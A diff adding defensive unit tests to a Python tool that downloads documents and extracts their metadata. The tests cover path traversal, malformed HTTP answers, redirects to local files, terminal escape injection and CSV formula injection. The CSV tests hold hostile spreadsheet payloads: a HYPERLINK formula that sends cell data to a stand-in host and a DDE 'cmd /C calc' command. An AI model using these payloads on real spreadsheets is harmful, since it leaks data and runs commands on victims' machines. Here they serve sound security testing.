@@ -10,12 +10,22 @@ import threading
 import unittest
 import http.server
 
-from powermeta import cli, exif, links, sources
+from powermeta import cli, exif, links, sources, web
 from powermeta.web import FetchError, download
 
-from .support import LocalServer, bing_page, patched, write_pdf
+from .support import LocalServer, RawServer, bing_page, patched, raw_answer, write_pdf
 
 EXIFTOOL = exif.find_exiftool()
+
+
+@contextlib.contextmanager
+def patched_builtin_open(module, replacement):
+    """Give one module its own open(), without touching the built-in one."""
+    module.open = replacement
+    try:
+        yield
+    finally:
+        del module.open
 
 
 def run_cli(arguments):
@@ -82,7 +92,135 @@ class Downloads(TemporaryFolder):
         with LocalServer(lambda request: (200, b"data")) as server:
             counts, _ = self.run_downloads([server.url + "/x/..%2F..%2Fescape.pdf", server.url + "/a.pdf/exiftool.exe", server.url + "/x/-o.pdf"])
         self.assertEqual(counts, (3, 0))
-        self.assertEqual(sorted(os.listdir(self.folder)), ["_-o.pdf", "_..%2F..%2Fescape.pdf", "_exiftool.exe"])
+        self.assertEqual(sorted(os.listdir(self.folder)), ["_-o.pdf", "_..%2F..%2Fescape.pdf", "_exiftool.exe.pdf"])
+
+    def test_every_saved_name_ends_in_a_wanted_type(self):
+        paths = ["/files/argparse.py?v=.pdf", "/files/setup.exe?doc=.pdf", "/files/run.bat?x.pdf", "/files/report.pdf.lnk", "/get.php?file=a.docx"]
+        with LocalServer(lambda request: (200, b"data")) as server:
+            output = io.StringIO()
+            with contextlib.redirect_stdout(output):
+                counts = cli.download_files([server.url + path for path in paths], self.folder, file_types=["pdf", "docx"])
+        self.assertEqual(counts, (5, 0))
+        self.assertEqual(
+            sorted(os.listdir(self.folder)), ["argparse.py.pdf", "get.php.docx", "report.pdf.lnk.pdf", "run.bat.pdf", "setup.exe.pdf"]
+        )
+
+    def test_an_address_with_spaces_or_other_characters_is_asked_for_in_plain_form(self):
+        with LocalServer(lambda request: (200, b"data")) as server:
+            counts, output = self.run_downloads([server.url + "/files/annual report \u00fc.pdf", "http://[bad/a.pdf", "http://127.0.0.1:99999/a.pdf"])
+            paths = [request.path for request in server.requests]
+        self.assertEqual(counts, (1, 2))
+        self.assertEqual(paths, ["/files/annual%20report%20%C3%BC.pdf"])
+        self.assertEqual(os.listdir(self.folder), ["annual report _.pdf"])
+
+
+class BrokenAnswers(TemporaryFolder):
+    """Whatever a server sends, one bad file must not end the run or be counted as downloaded."""
+
+    ANSWERS = {
+        "/garbage.pdf": b"NOT HTTP AT ALL\r\n\r\n",
+        "/short.pdf": b"HTTP/1.1 200 OK\r\nContent-Length: 100000\r\n\r\n" + b"x" * 500,
+        "/chunk.pdf": b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n1000\r\n" + b"x" * 100,
+        "/header.pdf": b"HTTP/1.1 200 OK\r\nX: " + b"a" * 70000 + b"\r\n\r\n",
+        "/toftp.pdf": b"HTTP/1.1 302 Found\r\nLocation: ftp://127.0.0.1:1/x.pdf\r\nContent-Length: 0\r\n\r\n",
+        "/tofile.pdf": b"HTTP/1.1 302 Found\r\nLocation: file:///etc/passwd\r\nContent-Length: 0\r\n\r\n",
+        "/big.pdf": b"HTTP/1.1 200 OK\r\nContent-Length: 99999999999\r\n\r\n" + b"x" * 500,
+        "/fine.pdf": raw_answer(b"%PDF-fine"),
+    }
+
+    def test_each_one_is_a_failed_download_and_leaves_nothing_behind(self):
+        with RawServer(lambda path: self.ANSWERS[path]) as server:
+            output = io.StringIO()
+            with contextlib.redirect_stdout(output):
+                counts = cli.download_files([server.url + path for path in self.ANSWERS], self.folder)
+        self.assertEqual(counts, (1, 7), output.getvalue())
+        self.assertEqual(os.listdir(self.folder), ["fine.pdf"])
+        text = output.getvalue()
+        self.assertIn("the connection closed after 500 of 100000 bytes", text)
+        self.assertIn("redirect to a link that is not http or https", text)
+        self.assertIn("the file is larger than", text)
+
+    def test_a_file_that_is_cut_off_is_fetched_from_the_archive_instead(self):
+        answers = dict(self.ANSWERS)
+        answers["/web/2020id_/short.pdf"] = raw_answer(b"%PDF-whole")
+        with RawServer(lambda path: answers[path]) as server:
+            output = io.StringIO()
+            with contextlib.redirect_stdout(output):
+                counts = cli.download_files(
+                    [server.url + "/short.pdf"], self.folder, archive_copies={server.url + "/short.pdf": server.url + "/web/2020id_/short.pdf"}
+                )
+        self.assertEqual(counts, (1, 0))
+        with open(os.path.join(self.folder, "short.pdf"), "rb") as saved:
+            self.assertEqual(saved.read(), b"%PDF-whole")
+
+    def test_a_download_without_end_is_stopped(self):
+        def endless(path):
+            yield b"HTTP/1.1 200 OK\r\n\r\n"
+            while True:
+                yield b"\0" * 65536
+
+        target = os.path.join(self.folder, "endless.pdf")
+        with RawServer(endless) as server:
+            with self.assertRaises(FetchError) as raised:
+                download(server.url + "/endless.pdf", target, max_bytes=3 * 1024 * 1024)
+        self.assertIn("larger than 3 MB", str(raised.exception))
+        self.assertEqual(os.listdir(self.folder), [])
+
+    def test_a_file_the_server_compressed_on_the_way_is_unpacked(self):
+        import gzip
+
+        body = write_pdf(None, "jsmith", "Writer")
+        packed = gzip.compress(body)
+        answers = {
+            "/a.pdf": raw_answer(packed, b"Content-Encoding: gzip\r\n"),
+            "/cut.pdf": raw_answer(packed[:60], b"Content-Encoding: gzip\r\n"),
+        }
+        with RawServer(lambda path: answers[path]) as server:
+            target = os.path.join(self.folder, "a.pdf")
+            download(server.url + "/a.pdf", target)
+            with open(target, "rb") as saved:
+                self.assertEqual(saved.read(), body)
+            with self.assertRaises(FetchError):
+                download(server.url + "/cut.pdf", os.path.join(self.folder, "cut.pdf"))
+        self.assertEqual(os.listdir(self.folder), ["a.pdf"])
+
+    def test_the_working_file_is_never_an_earlier_download(self):
+        earlier = os.path.join(self.folder, "a.pdf.part")
+        with open(earlier, "wb") as target:
+            target.write(b"an earlier file")
+        with RawServer(lambda path: raw_answer(b"%PDF-fine")) as server:
+            download(server.url + "/a.pdf", os.path.join(self.folder, "a.pdf"))
+        self.assertEqual(sorted(os.listdir(self.folder)), ["a.pdf", "a.pdf.part"])
+        with open(earlier, "rb") as saved:
+            self.assertEqual(saved.read(), b"an earlier file")
+
+    def test_an_interrupted_download_leaves_no_partial_file(self):
+        opened = []
+        real_open = open
+
+        class Interrupted:
+            """A file that is interrupted (as by Ctrl+C) at the first write."""
+
+            def __init__(self, path, mode):
+                self._file = real_open(path, mode)
+                opened.append(path)
+
+            def __enter__(self):
+                return self
+
+            def __exit__(self, *exc):
+                self._file.close()
+
+            def write(self, block):
+                self._file.write(block)
+                raise KeyboardInterrupt
+
+        with RawServer(lambda path: raw_answer(b"x" * 5000)) as server:
+            with patched_builtin_open(web, Interrupted):
+                with self.assertRaises(KeyboardInterrupt):
+                    download(server.url + "/a.pdf", os.path.join(self.folder, "a.pdf"))
+        self.assertEqual([os.path.basename(path) for path in opened], [".part-a.pdf"])
+        self.assertEqual(os.listdir(self.folder), [])
 
 
 @unittest.skipUnless(shutil.which("openssl"), "openssl is needed to make a test certificate")
@@ -194,12 +332,84 @@ class Extraction(TemporaryFolder):
         self.assertIn(b"SourceFile", data.splitlines()[0])
         self.assertEqual(len(data.decode("utf-8-sig").strip().splitlines()), 4)
 
+    def test_cells_that_a_spreadsheet_would_run_are_made_plain_text(self):
+        import csv
+
+        formula = '=HYPERLINK("http://evil.example/?"&A1,"click")'
+        command = "@SUM(1+1)*cmd|' /C calc'!A0"
+        hostile = os.path.join(self.folder, "hostile")
+        os.mkdir(hostile)
+        write_pdf(os.path.join(hostile, "formula.pdf"), formula, command)
+        write_pdf(os.path.join(hostile, "plain.pdf"), "-5", "+0.3")
+        target = os.path.join(self.folder, "hostile.csv")
+        self.assertEqual(exif.extract_all_to_csv(EXIFTOOL, hostile, target), 2)
+        with open(target, encoding="utf-8-sig", newline="") as saved:
+            rows = list(csv.DictReader(saved))
+        by_file = {os.path.basename(row["SourceFile"]): row for row in rows}
+        self.assertEqual(by_file["formula.pdf"]["Author"], "'" + formula)
+        self.assertEqual(by_file["formula.pdf"]["Creator"], "'" + command)
+        # Plain numbers are no formulas and stay as they are
+        self.assertEqual((by_file["plain.pdf"]["Author"], by_file["plain.pdf"]["Creator"]), ("-5", "+0.3"))
+        for row in rows:
+            for value in row.values():
+                self.assertFalse(value[:1] in "=@" and value, value)
+
     def test_empty_folder(self):
         empty = os.path.join(self.folder, "empty")
         os.mkdir(empty)
         self.assertEqual(exif.extract_authors(EXIFTOOL, empty), (0, []))
         self.assertEqual(exif.extract_all_to_csv(EXIFTOOL, empty, os.path.join(self.folder, "none.csv")), 0)
         self.assertFalse(os.path.exists(os.path.join(self.folder, "none.csv")))
+
+
+class CsvCells(unittest.TestCase):
+    def test_which_cells_get_an_apostrophe(self):
+        cases = {
+            "=1+1": "'=1+1",
+            "+1+1": "'+1+1",
+            "-1+cmd|' /C calc'!A0": "'-1+cmd|' /C calc'!A0",
+            "@SUM(A1)": "'@SUM(A1)",
+            "\t=1+1": "'\t=1+1",
+            "\r=1+1": "'\r=1+1",
+            "-5": "-5",
+            "+0.3": "+0.3",
+            "-1,5": "-1,5",
+            "-1/3": "'-1/3",
+            "+02:00": "'+02:00",
+            "John Smith": "John Smith",
+            "a=b": "a=b",
+            "": "",
+        }
+        for cell, expected in cases.items():
+            self.assertEqual(exif.inert_cell(cell), expected, repr(cell))
+
+    @unittest.skipIf(os.name == "nt", "uses a shell script as a stand-in for ExifTool")
+    def test_the_whole_file_is_rewritten_also_with_line_breaks_and_nul_characters(self):
+        import csv
+
+        folder = tempfile.mkdtemp(prefix="powermeta-test-")
+        self.addCleanup(shutil.rmtree, folder, ignore_errors=True)
+        fake = os.path.join(folder, "fake-exiftool")
+        with open(fake, "w") as target:
+            target.write(
+                "#!/bin/sh\n"
+                "printf 'SourceFile,Author,-Odd,Comment\\r\\n'\n"
+                "printf 'a.pdf,=1+1,x,\"two\\nlines, one cell\"\\r\\n'\n"
+                "printf 'b.pdf,nul\\000inside,-2,\"say \"\"hi\"\"\"\\r\\n'\n"
+            )
+        os.chmod(fake, 0o755)
+        target = os.path.join(folder, "out.csv")
+        self.assertEqual(exif.extract_all_to_csv(fake, folder, target), 2)
+        with open(target, encoding="utf-8-sig", newline="") as saved:
+            rows = list(csv.reader(saved))
+        self.assertEqual(
+            rows,
+            [
+                ["SourceFile", "Author", "'-Odd", "Comment"],
+                ["a.pdf", "'=1+1", "x", "two\nlines, one cell"],
+                ["b.pdf", "nulinside", "-2", 'say "hi"'],
+            ],
+        )
 
 
 class CommandLine(TemporaryFolder):
@@ -284,7 +494,7 @@ class CommandLine(TemporaryFolder):
 
         calls = []
 
-        def fake_search(engines, domain, file_types, max_pages, delay, browser_name, log):
+        def fake_search(engines, domain, file_types, max_pages, delay, browser_name, log, on_link=None):
             calls.append((list(engines), domain, list(file_types), browser_name))
             # The browser finds today's https address of a file the Archive lists under http
             return ["https://127.0.0.1:%d/files/report.pdf" % self.server.port, "http://127.0.0.1:%d/files/browser-only.pdf" % self.server.port]
@@ -313,6 +523,128 @@ class CommandLine(TemporaryFolder):
         self.assertIn("No file types", run_cli(["-d", "example.com", "-t", "p df"])[1])
         with self.assertRaises(SystemExit), contextlib.redirect_stderr(io.StringIO()):
             cli.main(["-d", "example.com", "--sources", "altavista"])
+        errors = io.StringIO()
+        with self.assertRaises(SystemExit), contextlib.redirect_stderr(errors):
+            cli.main(["--download"])
+        self.assertIn("--list-in", errors.getvalue())
+
+    def test_a_list_written_by_windows_powershell_is_read(self):
+        # Windows PowerShell 5.1 writes UTF-16 with a byte-order mark for ">" and Out-File
+        out = os.path.join(self.folder, "out")
+        with LocalServer(self.respond) as server:
+            self.server = server
+            text = server.url + "/files/report.pdf\r\n\r\n  " + server.url + "/files/second.pdf  \r\n"
+            for number, encoding in enumerate(("utf-16", "utf-16-be", "utf-8-sig", "utf-8")):
+                listed = os.path.join(self.folder, "links-%d.txt" % number)
+                with open(listed, "wb") as target:
+                    target.write((b"\xfe\xff" if encoding == "utf-16-be" else b"") + text.encode(encoding))
+                # No domain is needed when the links come from a list
+                code, output = run_cli(["--list-in", listed, "--download", "-o", out + str(number)])
+                self.assertEqual(code, 0, output)
+                self.assertIn("[*] Downloaded 2 files", output, encoding)
+                self.assertEqual(sorted(os.listdir(out + str(number))), ["report.pdf", "second.pdf"])
+
+    def test_a_link_list_that_cannot_be_written_is_noticed_before_the_search(self):
+        code, output, server = self.run_with_server(
+            ["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--list-out", os.path.join(self.folder, "missing", "links.txt")]
+        )
+        self.assertEqual(code, 1, output)
+        self.assertIn("does not exist", output)
+        self.assertEqual(server.requests, [])
+
+    def test_links_are_printed_when_writing_the_list_fails_after_the_search(self):
+        def refuse(path, file_links):
+            return real_write(os.path.join(self.folder, "missing", "links.txt"), file_links)
+
+        real_write = cli.write_link_list
+        with patched(cli, write_link_list=refuse), patched(cli.sys, stdin=io.StringIO("")):
+            code, output, server = self.run_with_server(
+                ["-d", "127.0.0.1", "-t", "pdf", "--sources", "archive", "--list-out", os.path.join(self.folder, "links.txt")]
+            )
+        self.assertEqual(code, 0, output)
+        self.assertIn("They are listed here instead:", output)
+        self.assertIn("\n%s/files/report.pdf\n" % server.url, output)
+
+    def test_the_exit_code_says_when_nothing_could_be_downloaded_or_extracted(self):
+        out = os.path.join(self.folder, "out")
+        listed = os.path.join(self.folder, "links.txt")
+        with LocalServer(self.respond) as server:
+            self.server = server
+            with open(listed, "w") as target:
+                target.write(server.url + "/nowhere.pdf\n" + server.url + "/nowhere-2.pdf\n")
+            code, output = run_cli(["--list-in", listed, "--download", "--extract", "-o", out])
+            self.assertEqual(code, 1, output)
+            self.assertIn("(2 failed)", output)
+            self.assertNotIn("extracting metadata", output)
+
+            with open(listed, "w") as target:
+                target.write(server.url + "/files/report.pdf\n")
+            with patched(exif, find_exiftool=lambda: None):
+                code, output = run_cli(["--list-in", listed, "--download", "--extract", "-o", out + "2"])
+            self.assertEqual(code, 1, output)
+            self.assertIn("[*] Downloaded 1 files", output)
+            self.assertIn("ExifTool was not found", output)
+
+    def test_ctrl_c_during_the_search_keeps_what_was_found_and_downloads_nothing(self):
+        def interrupted(*args, **kwargs):
+            raise KeyboardInterrupt
+
+        out = os.path.join(self.folder, "out")
+        listed = os.path.join(self.folder, "links.txt")
+        with patched(sources, search_bing=interrupted):
+            code, output, server = self.run_with_server(
+                ["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", out, "--list-out", listed]
+            )
+        self.assertEqual(code, 130, output)
+        self.assertIn("Interrupted: the search stops here", output)
+        self.assertIn("[*] A total of 2 files were discovered.", output)
+        self.assertFalse(os.path.exists(out))
+        with open(listed) as saved:
+            self.assertEqual(saved.read().split(), [server.url + "/files/report.pdf", server.url + "/gone.pdf"])
+
+        # Without --list-out the links are shown, so that they are not lost
+        with patched(sources, search_bing=interrupted):
+            code, output, server = self.run_with_server(["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", out])
+        self.assertEqual(code, 130, output)
+        self.assertIn("\n%s/gone.pdf\n" % server.url, output)
+        self.assertFalse(os.path.exists(out))
+
+    def test_ctrl_c_during_the_downloads_ends_the_run_without_a_traceback(self):
+        def interrupted(*args, **kwargs):
+            raise KeyboardInterrupt
+
+        with patched(cli, download=interrupted):
+            code, output, _ = self.run_with_server(
+                ["-d", "127.0.0.1", "-t", "pdf", "--sources", "archive", "--download", "-o", os.path.join(self.folder, "out")]
+            )
+        self.assertEqual(code, 130, output)
+        self.assertIn("[!] Interrupted.", output)
+
+    def test_the_internet_archive_is_told_that_this_is_a_program(self):
+        out = os.path.join(self.folder, "out")
+        code, output, server = self.run_with_server(["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", out])
+        self.assertEqual(code, 0, output)
+        agents = {}
+        for request in server.requests:
+            agents.setdefault(request.path.split("/")[1], set()).add(request.headers.get("User-Agent"))
+        self.assertEqual(agents["cdx"], {web.PROGRAM_USER_AGENT})
+        self.assertEqual(agents["web"], {web.PROGRAM_USER_AGENT})  # the Archive's copy of a file that is gone
+        self.assertEqual(agents["bing"], {web.DEFAULT_USER_AGENT})
+        self.assertEqual(agents["files"], {web.DEFAULT_USER_AGENT})
+        self.assertRegex(web.PROGRAM_USER_AGENT, r"^PowerMeta/\d")
+
+        # A User-Agent that was asked for is used everywhere
+        code, output, server = self.run_with_server(
+            ["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", out + "2", "--user-agent", "Example/1.0"]
+        )
+        self.assertEqual({request.headers.get("User-Agent") for request in server.requests}, {"Example/1.0"})
+
+    def test_text_from_outside_cannot_steer_the_terminal(self):
+        output = io.StringIO()
+        with contextlib.redirect_stdout(output):
+            cli.log("author \x1b[31mred\x07 \u202egnp.exe\rover\x9b2J")
+            cli.log("two\nlines\tand a tab stay")
+        self.assertEqual(output.getvalue(), "author ?[31mred? ?gnp.exe?over?2J\ntwo\nlines\tand a tab stay\n")
 
     @unittest.skipUnless(EXIFTOOL, "ExifTool is not installed")
     def test_extract_dir(self):
